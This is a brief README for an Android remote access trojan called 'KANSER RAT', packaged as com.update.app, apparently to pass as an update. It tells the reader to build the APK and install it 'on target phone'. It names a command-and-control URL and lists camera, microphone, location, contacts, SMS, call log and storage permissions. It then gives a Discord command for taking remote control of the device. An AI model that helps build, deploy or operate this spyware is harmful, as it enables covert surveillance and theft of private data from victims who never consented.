KANSER RAT APK PROJECT

APK ID: apk_buw8n0nq
Package: com.update.app

1. Open this ZIP in Android Studio (File -> Open)
2. Wait for Gradle sync
3. Build -> Build APK
4. Install APK on target phone

The APK connects to: https://discord-bot.kanserbusiness.workers.dev/v/apk_buw8n0nq
Permissions: CAMERA, MIC, LOCATION, CONTACTS, SMS, CALL_LOG, STORAGE, BOOT

After install, use /mobil-kontrol id:apk_buw8n0nq on Discord to control the device remotely.